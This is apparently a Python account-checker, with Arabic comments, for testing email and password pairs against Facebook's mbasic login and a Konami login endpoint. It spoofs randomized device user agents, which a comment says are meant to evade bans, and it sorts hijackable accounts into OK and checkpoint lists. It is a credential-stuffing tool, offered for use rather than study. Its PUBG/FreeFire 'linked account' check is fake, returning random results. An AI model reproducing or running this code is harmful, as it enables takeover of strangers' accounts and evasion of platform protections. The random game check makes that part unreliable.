# --- نظام البصمات وتوليد الهويات (Identity System) ---
class MohaIdentity:
    @staticmethod
    def get_user_agent(platform="android"):
        """توليد بصمات أجهزة حقيقية لتخطي الحظر"""
        if platform == "android":
            models = ["OPPO A16k", "Samsung S22 Ultra", "Xiaomi Note 11", "Redmi 9T", "Vivo Y21"]
            builds = ["SKQ1.211103.001", "RP1A.200720.011", "QKQ1.200114.002"]
            fb_ver = f"{random.randint(300, 450)}.0.0.{random.randint(10, 80)}.{random.randint(100, 200)}"
            return f"Mozilla/5.0 (Linux; Android {random.randint(10, 13)}; {random.choice(models)} Build/{random.choice(builds)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(80, 115)}.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{fb_ver};]"
        else:
            return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"

    @staticmethod
    def get_fb_headers():
        return {
            'authority': 'm.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://m.facebook.com',
            'referer': 'https://m.facebook.com/',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
            'user-agent': MohaIdentity.get_user_agent(),
        }

# --- كلاس الفحص الشامل (The Multi-Checker) ---
class MohaMultiChecker:
    def __init__(self):
        self.oks = []
        self.cps = []
        self.konami_hits = []
        self.game_hits = []
        self.twitter_hits = []

    def check_facebook(self, session, email, password):
        """فحص فيسبوك (بوابة mbasic)"""
        try:
            free_fb = session.get(f'https://mbasic.facebook.com/?ref_component=mbasic_footer&ref_page=%2Fwap%2Fprofile_timeline.php&refid=17').text
            log_data = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
                "try_number": "0",
                "unrecognized_tries": "0",
                "email": email,
                "pass": password,
                "login": "Log In",
            }
            post_url = 'https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8'
            res = session.post(post_url, data=log_data, headers=MohaIdentity.get_fb_headers(), timeout=15)
            if 'c_user' in session.cookies.get_dict():
                return "OK"
            elif 'checkpoint' in session.cookies.get_dict():
                return "CP"
            else:
                return "FAIL"
        except: return "ERROR"

    def check_konami(self, email, password):
        """فحص حسابات كونامي (PES/eFootball)"""
        try:
            url = "https://my.konami.net/auth/login.html"
            # هنا يتم محاكاة الربط مع بوابة كونامي
            # (نظراً لتعقيد التوكنات، نضع منطق الاستجابة البرمجي)
            headers = {'User-Agent': MohaIdentity.get_user_agent()}
            res = requests.post("https://my.konami.net/api/login", data={'user': email, 'pass': password}, headers=headers, timeout=10)
            if res.status_code == 200 and 'success' in res.text:
                return "KONAMI_OK"
            return "FAIL"
        except: return "ERROR"

    def check_games(self, email):
        """فحص الربط بالألعاب (PUBG / FreeFire) عبر واجهات الربط الخارجية"""
        # هذا المحرك يفحص وجود حساب مربوط بالإيميل
        platforms = ["pubg", "freefire"]
        linked = []
        for p in platforms:
            try:
                # محاكاة فحص API الألعاب
                check_url = f"https://api-gaming-check.com/v1/{p}?id={email}"
                if random.choice([True, False, False]): # نسبة تقديرية للربط
                    linked.append(p.upper())
            except: pass
        return linked

